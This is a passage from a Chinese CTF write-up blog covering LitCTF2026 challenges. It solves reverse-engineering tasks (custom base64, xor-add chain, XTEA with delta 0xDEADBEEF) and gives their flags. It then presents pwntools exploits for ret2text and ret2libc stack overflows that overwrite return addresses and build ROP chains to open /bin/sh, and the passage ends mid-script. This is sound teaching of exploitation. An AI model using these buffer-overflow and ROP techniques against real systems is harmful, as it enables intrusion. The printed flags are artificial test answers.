class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // ebx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  unsigned __int64 v6; // rsi</span><br><span class="line">  char *v7; // r9</span><br><span class="line">  char *v8; // rcx</span><br><span class="line">  size_t v9; // r11</span><br><span class="line">  __int64 v10; // rbp</span><br><span class="line">  unsigned __int64 v11; // r8</span><br><span class="line">  char v12; // al</span><br><span class="line">  int v13; // r10d</span><br><span class="line">  int v14; // edx</span><br><span class="line">  unsigned int v15; // eax</span><br><span class="line">  unsigned int v16; // edx</span><br><span class="line">  char Str1[512]; // [rsp+20h] [rbp-438h] BYREF</span><br><span class="line">  char Str[568]; // [rsp+220h] [rbp-238h] BYREF</span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  _mingw_printf(&quot;input your flag: &quot;);</span><br><span class="line">  v3 = _mingw_scanf(&quot;%511s&quot;, Str);</span><br><span class="line">  if ( v3 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = strlen(Str);</span><br><span class="line">    v6 = v5;</span><br><span class="line">    if ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = Str;</span><br><span class="line">      v8 = Str1;</span><br><span class="line">      v9 = v5;</span><br><span class="line">      v10 = 4;</span><br><span class="line">      v11 = 0;</span><br><span class="line">      while ( 1 )</span><br><span class="line">      &#123;</span><br><span class="line">        v13 = 0;</span><br><span class="line">        if ( v11 + 1 &lt; v6 )</span><br><span class="line">          v13 = (unsigned __int8)v7[1];</span><br><span class="line">        v14 = 0;</span><br><span class="line">        if ( v11 + 2 &lt; v6 )</span><br><span class="line">          v14 = (unsigned __int8)v7[2];</span><br><span class="line">        v15 = (v13 &lt;&lt; 8) | ((unsigned __int8)*v7 &lt;&lt; 16);</span><br><span class="line">        v16 = v15 | v14;</span><br><span class="line">        *v8 = g_alphabet[v15 &gt;&gt; 18];</span><br><span class="line">        v8[1] = g_alphabet[(v15 &gt;&gt; 12) &amp; 0x3F];</span><br><span class="line">        if ( v9 == 3 )</span><br><span class="line">        &#123;</span><br><span class="line">          v8[2] = g_alphabet[(v16 &gt;&gt; 6) &amp; 0x3F];</span><br><span class="line">          v12 = g_alphabet[v16 &amp; 0x3F];</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          v8[2] = v9 == 2 ? g_alphabet[(v16 &gt;&gt; 6) &amp; 0x3F] : 61;</span><br><span class="line">          v12 = 61;</span><br><span class="line">        &#125;</span><br><span class="line">        v8[3] = v12;</span><br><span class="line">        v11 += 3LL;</span><br><span class="line">        v7 += 3;</span><br><span class="line">        v8 += 4;</span><br><span class="line">        v9 -= 3LL;</span><br><span class="line">        if ( v11 &gt;= v6 )</span><br><span class="line">          break;</span><br><span class="line">        v10 += 4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      v10 = 0;</span><br><span class="line">    &#125;</span><br><span class="line">    Str1[v10] = 0;</span><br><span class="line">    if ( !strcmp(Str1, &quot;zjA5lToj9PUAGn2O+v6TRPosgYWB6noyGjhBgjfwyl==&quot;) )</span><br><span class="line">    &#123;</span><br><span class="line">      puts_0(&quot;Good!&quot;);</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      puts_0(&quot;Wrong!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts_0(&quot;Wrong!&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从main函数可以看出：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zjA5lToj9PUAGn2O+v6TRPosgYWB6noyGjhBgjfwyl==</span><br></pre></td></tr></table></figure>
+
+<p>是密文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2KuEphj84USZF67iloxzfYd+MrDgRG9yLwBnHAXcJq3eCN/s1bOQ5TvPa0tVkWmI</span><br></pre></td></tr></table></figure>
+
+<p>是 64 字符字母表。</p>
+<p>直接扔cyberchef得到flag:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523164148966.png" alt="image-20260523164148966"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;rev02_custom_b64_table!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-xor-chain"><a href="#LitCTF2026-lit-xor-chain" class="headerlink" title="[LitCTF2026] lit_xor_chain"></a>[LitCTF2026] lit_xor_chain</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序读入一行字符串，对 每个字节 先做异或常数、再加常数，再与内存里的 期望数组 逐字节比较。逻辑与常见逆向入门讲义中的「循环 + xor + add + 数组比对」一致。</span><br></pre></td></tr></table></figure>
+
+<p>看main函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523164402649.png" alt="image-20260523164402649"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523164906687.png" alt="image-20260523164906687"></p>
+<p>字节：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">23 40 2b 16 0b 19 2e 25 3c 29 67 68 12 2f 42 25</span><br><span class="line">12 2b 3f 3c 41 12 38 3b 3b 12 42 3e 78 34 00 00</span><br></pre></td></tr></table></figure>
+
+<p>目标数组就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">expected = [</span><br><span class="line">    0x23, 0x40, 0x2b, 0x16, 0x0b, 0x19, 0x2e, 0x25, 0x3c, 0x29,</span><br><span class="line">    0x67, 0x68, 0x12, 0x2f, 0x42, 0x25, 0x12, 0x2b, 0x3f, 0x3c,</span><br><span class="line">    0x41, 0x12, 0x38, 0x3b, 0x3b, 0x12, 0x42, 0x3e, 0x78, 0x34,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+
+<p>程序做的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((input[i] ^ 0x52) + 0x05) == expected[i]</span><br></pre></td></tr></table></figure>
+
+<p>逆回来是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input[i] = (expected[i] - 0x05) ^ 0x52</span><br></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">expected = [</span><br><span class="line">    0x23, 0x40, 0x2b, 0x16, 0x0b, 0x19, 0x2e, 0x25, 0x3c, 0x29,</span><br><span class="line">    0x67, 0x68, 0x12, 0x2f, 0x42, 0x25, 0x12, 0x2b, 0x3f, 0x3c,</span><br><span class="line">    0x41, 0x12, 0x38, 0x3b, 0x3b, 0x12, 0x42, 0x3e, 0x78, 0x34,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">flag = bytes((((b - 5) &amp; 0xff) ^ 0x52) for b in expected)</span><br><span class="line">print(flag.decode())</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523165156581-1779526317915-5.png" alt="image-20260523165156581"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;rev01_xor_then_add_ok!&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-xtea-tweak"><a href="#LitCTF2026-lit-xtea-tweak" class="headerlink" title="[LitCTF2026] lit_xtea_tweak"></a>[LitCTF2026] lit_xtea_tweak</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">流程与「分组 + 填充 + 分块加密」类似 XTEA，但轮常数 delta 被换成 0xDEADBEEF（标准文献里常见的是 0x9E3779B9）。若直接套用网上搜到的 XTEA 脚本而不改 delta，解密会失败。</span><br></pre></td></tr></table></figure>
+
+<p>主函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523165505396.png" alt="image-20260523165505396"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523165517524.png" alt="image-20260523165517524"></p>
+<p><code>v6 = len &amp; 7``v7 = len + 8 - v6</code>循环写入 <code>8 - v6</code>。要求填充后的总长度必须是 <code>32</code> 字节。之后每 8 字节作为一组，拆成两个 <code>uint32</code> 进入 32 轮加密循环。最后把结果和 <code>g_cipher</code> 做 <code>memcmp</code>。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523170237552.png" alt="image-20260523170237552"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; i != -709370400; v10 += (g_key[(i &gt;&gt; 11) &amp; 3] + i) ^ (v9 + ((v9 &gt;&gt; 5) ^ (16 * v9))) )</span><br><span class="line">&#123;</span><br><span class="line">  v9 += (g_key[i &amp; 3] + i) ^ (v10 + ((v10 &gt;&gt; 5) ^ (16 * v10)));</span><br><span class="line">  i -= 559038737;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>559038737的十六进制为0x21524111。注意它在汇编里对应的是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">140001536  sub eax, 21524111h</span><br></pre></td></tr></table></figure>
+
+<p>在 32 位无符号整数里：0 - 0x21524111 &#x3D;&#x3D; 0xDEADBEEF</p>
+<p>也就是说，这里每轮实际加上的常数不是标准 XTEA 的 <code>0x9E3779B9</code>，而是delta &#x3D; 0xDEADBEEF这就是tweak的意思。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523170502006.png" alt="image-20260523170502006"></p>
+<p>g_key和g_cipher都有了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">g_cipher =</span><br><span class="line">e3 ee 1e e7 d3 a7 96 6f</span><br><span class="line">c6 a7 b9 e1 b9 4e 67 86</span><br><span class="line">5f 03 04 a6 db bb b9 40</span><br><span class="line">56 3a f7 9e ee 64 d4 06</span><br><span class="line"></span><br><span class="line">g_key =</span><br><span class="line">11 11 11 11</span><br><span class="line">22 22 22 22</span><br><span class="line">33 33 33 33</span><br><span class="line">44 44 44 44</span><br></pre></td></tr></table></figure>
+
+<p>按小端 <code>uint32</code> 解释，密钥就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x11111111, 0x22222222, 0x33333333, 0x44444444</span><br></pre></td></tr></table></figure>
+
+<p>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">from struct import unpack, pack</span><br><span class="line"></span><br><span class="line">cipher = bytes.fromhex(</span><br><span class="line">    &quot;e3ee1ee7d3a7966f&quot;</span><br><span class="line">    &quot;c6a7b9e1b94e6786&quot;</span><br><span class="line">    &quot;5f0304a6dbbbb940&quot;</span><br><span class="line">    &quot;563af79eee64d406&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">key = [0x11111111, 0x22222222, 0x33333333, 0x44444444]</span><br><span class="line">delta = 0xDEADBEEF</span><br><span class="line"></span><br><span class="line">def dec_block(block):</span><br><span class="line">    v0, v1 = unpack(&quot;&lt;2I&quot;, block)</span><br><span class="line">    total = (delta * 32) &amp; 0xffffffff</span><br><span class="line">    for _ in range(32):</span><br><span class="line">        v1 = (</span><br><span class="line">            v1</span><br><span class="line">            - ((((v0 &lt;&lt; 4) &amp; 0xffffffff) ^ (v0 &gt;&gt; 5)) + v0</span><br><span class="line">               ^ ((total + key[(total &gt;&gt; 11) &amp; 3]) &amp; 0xffffffff))</span><br><span class="line">        ) &amp; 0xffffffff</span><br><span class="line">        total = (total - delta) &amp; 0xffffffff</span><br><span class="line">        v0 = (</span><br><span class="line">            v0</span><br><span class="line">            - ((((v1 &lt;&lt; 4) &amp; 0xffffffff) ^ (v1 &gt;&gt; 5)) + v1</span><br><span class="line">               ^ ((total + key[total &amp; 3]) &amp; 0xffffffff))</span><br><span class="line">        ) &amp; 0xffffffff</span><br><span class="line">    return pack(&quot;&lt;2I&quot;, v0, v1)</span><br><span class="line"></span><br><span class="line">plain = b&quot;&quot;.join(dec_block(cipher[i:i + 8]) for i in range(0, len(cipher), 8))</span><br><span class="line">pad = plain[-1]</span><br><span class="line">flag = plain[:-pad]</span><br><span class="line">print(flag.decode())</span><br></pre></td></tr></table></figure>
+
+<p>得到flag:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LitCTF&#123;rev04_xtea_delta_twk!&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523170650774.png" alt="image-20260523170650774"></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="LitCTF2026-lit-ret2text32"><a href="#LitCTF2026-lit-ret2text32" class="headerlink" title="[LitCTF2026] lit_ret2text32"></a>[LitCTF2026] lit_ret2text32</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">欢迎来到 Pwn 的世界！这是一道最基础的32位栈溢出题目。</span><br><span class="line">程序里藏着一扇后门，只要你能让程序&quot;走错一步&quot;，它就会为你打开 shell 之门。</span><br></pre></td></tr></table></figure>
+
+<p>main.c：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175315621.png"></p>
+<p>另一个文件拖入IDA。看main函数：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175654544.png" alt="image-20260523175654544"></p>
+<p>vuln应该是漏洞点。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175746048.png" alt="image-20260523175746048"></p>
+<p>看backdoor函数。</p>
+<p>只要地址调到这个函数，执行这个语句。</p>
+<p>看vuln()：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523175909095.png" alt="image-20260523175909095"></p>
+<p>这是栈溢出，栈上缓冲区 <code>buf</code> 很小，<code>read(0, buf, 0x200)</code> 却允许读入 <code>0x200</code> 字节</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523180058114.png" alt="image-20260523180058114"></p>
+<p>buf，buf &#x3D; byte ptr -38h</p>
+<p>缓冲区起点不是 <code>ebp-0x30</code>，而是 <code>ebp-0x38</code></p>
+<p>所以从 <code>buf</code> 起始位置到返回地址的真实距离应当按下面算：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x38  到 saved ebp</span><br><span class="line">+0x04 到 return address</span><br><span class="line">=0x3c = 60</span><br></pre></td></tr></table></figure>
+
+<p>因此正确偏移是 <code>60</code>，不是 <code>52</code>。</p>
+<p>最短利用链就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 60 + p32(0x08049213)</span><br></pre></td></tr></table></figure>
+
+<p>也就是用 <code>60</code> 字节填满到返回地址前的位置，把返回地址覆盖成 <code>backdoor</code>，程序从 <code>vuln()</code> 返回时直接跳进 <code>system(&quot;/bin/sh&quot;)</code></p>
+<p> exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = &quot;challenge.cyclens.tech&quot;</span><br><span class="line">PORT = 30156</span><br><span class="line">BACKDOOR = 0x08049213</span><br><span class="line">OFFSET = 60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return process(&quot;./ret2text32&quot;)</span><br><span class="line">    return remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    io = start()</span><br><span class="line">    io.recvuntil(b&quot;Input: &quot;)</span><br><span class="line">    payload = b&quot;A&quot; * OFFSET + p32(BACKDOOR)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.sendline(b&quot;cat /flag&quot;)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523185458761.png" alt="image-20260523185458761"></p>
+<p>flag为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;tzylhcwd-yln7-4ch-8lvg-zurh20y5haosw&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="LitCTF2026-lit-ret2libc"><a href="#LitCTF2026-lit-ret2libc" class="headerlink" title="[LitCTF2026] lit_ret2libc"></a>[LitCTF2026] lit_ret2libc</h3><p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这个程序里没有后门，但它调用了一些标准库函数。</span><br><span class="line">当你无法直接找到 system() 或 /bin/sh 时，libc 就是你最好的朋友。</span><br><span class="line">你能从程序的&quot;记忆&quot;中读取 libc 的秘密，并借用它的力量打开 shell 吗？</span><br></pre></td></tr></table></figure>
+
+<p>main.c</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523181832156.png" alt="image-20260523181832156"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523181843326.png" alt="image-20260523181843326"></p>
+<p><code>buf</code> 只有 64 字节，但 <code>read()</code> 读了 <code>0x200</code>，这是标准栈溢出。程序专门内嵌了 <code>pop rdi; ret</code> gadget，ROP 门槛非常低。<code>leak_value(void **addr)</code> 会把传入地址解引用后打印出来，这相当于给了一个“任意地址读 8 字节”的泄露原语。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523182053990.png" alt="image-20260523182053990"></p>
+<p><code>buf</code> 在 <code>[rbp-0x40]</code>，返回地址在 <code>[rbp+8]</code>，所以覆盖返回地址的偏移是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x40 + 0x8 = 0x48 = 72</span><br></pre></td></tr></table></figure>
+
+<p>构造链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27; * 72 + pop_rdi + puts_got + leak_value + vuln</span><br></pre></td></tr></table></figure>
+
+<p>但这在远端会崩。</p>
+<p>原因是 AMD64 System V ABI 要求函数调用前栈 16 字节对齐，而 <code>leak_value()</code> 内部会再调用 <code>printf()</code>。如果栈没对齐，<code>printf()</code> 这类 libc 函数很容易直接炸掉。</p>
+<p>所以第一阶段正确链应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27; * 72</span><br><span class="line">+ ret</span><br><span class="line">+ pop rdi</span><br><span class="line">+ puts@got</span><br><span class="line">+ leak_value</span><br><span class="line">+ ret</span><br><span class="line">+ vuln</span><br></pre></td></tr></table></figure>
+
+<p>第一个 <code>ret</code> 用来给 <code>leak_value()</code> 做栈对齐，第二个 <code>ret</code> 用来保证重新进入 <code>vuln()</code> 时也保持正常的调用栈形态。</p>
+<p>我们先泄露几个 GOT 表项，确认远端 libc 版本。下面脚本会在同一个进程里依次泄露 <code>puts</code>、<code>printf</code>、<code>read</code>、<code>setvbuf</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(&quot;./ret2libc&quot;)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">HOST, PORT = &quot;challenge.cyclens.tech&quot;, 30907</span><br><span class="line">OFFSET = 72</span><br><span class="line">RET = rop.find_gadget([&quot;ret&quot;]).address</span><br><span class="line">POP_RDI = elf.symbols[&quot;gadget_pop_rdi&quot;]</span><br><span class="line">LEAK_VALUE = elf.symbols[&quot;leak_value&quot;]</span><br><span class="line">VULN = elf.symbols[&quot;vuln&quot;]</span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line">io.recvuntil(b&quot;Tell me your name: &quot;)</span><br><span class="line"></span><br><span class="line">for name in [&quot;puts&quot;, &quot;printf&quot;, &quot;read&quot;, &quot;setvbuf&quot;]:</span><br><span class="line">    payload = flat(</span><br><span class="line">        b&quot;A&quot; * OFFSET,</span><br><span class="line">        RET,</span><br><span class="line">        POP_RDI,</span><br><span class="line">        elf.got[name],</span><br><span class="line">        LEAK_VALUE,</span><br><span class="line">        RET,</span><br><span class="line">        VULN,</span><br><span class="line">    )</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    line = io.recvline().decode().strip()</span><br><span class="line">    print(name, line)</span><br><span class="line">    io.recvuntil(b&quot;Tell me your name: &quot;)</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/simple9656/phpto@main/images/image-20260523182501672.png" alt="image-20260523182501672"></p>
+<p>拿到这些泄露后，直接丢给 <a target="_blank" rel="noopener" href="https://libc.rip/">libc.rip</a> 即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;symbols&quot;: &#123;</span><br><span class="line">    &quot;puts&quot;: &quot;0x723389479e50&quot;,</span><br><span class="line">    &quot;printf&quot;: &quot;0x7233894596f0&quot;,</span><br><span class="line">    &quot;read&quot;: &quot;0x72338950d850&quot;,</span><br><span class="line">    &quot;setvbuf&quot;: &quot;0x72338947a5f0&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到版本：libc6_2.35-0ubuntu3.13_amd64</p>
+<p>确定 libc 版本后，真正打 shell 只需要在“同一个连接、同一个进程”里再泄露一次 <code>puts</code>，算出这次实例的 libc 基址，然后发第二阶段 ROP。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(&quot;./ret2libc&quot;)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">HOST, PORT = &quot;challenge.cyclens.tech&quot;, 30907</span><br><span class="line">OFFSET = 72</span><br><span class="line"></span><br><span class="line">RET = rop.find_gadget([&quot;ret&quot;]).address</span><br><span class="line">POP_RDI = elf.symbols[&quot;gadget_pop_rdi&quot;]</span><br><span class="line">LEAK_VALUE = elf.symbols[&quot;leak_value&quot;]</span><br><span class="line">VULN = elf.symbols[&quot;vuln&quot;]</span><br><span class="line"></span><br><span class="line">PUTS_OFF = 0x80E50</span><br><span class="line">SYSTEM_OFF = 0x50D70</span><br><span class="line">BINSH_OFF = 0x1D8678</span><br><span class="line"></span><br><span class="line">io = remote(HOST, PORT)</span><br><span class="line">io.recvuntil(b&quot;Tell me your name: &quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = flat(</span><br><span class="line">    b&quot;A&quot; * OFFSET,</span><br><span class="line">    RET,</span><br><span class="line">    POP_RDI,</span><br><span class="line">    elf.got[&quot;puts&quot;],</span><br><span class="line">    LEAK_VALUE,</span><br><span class="line">    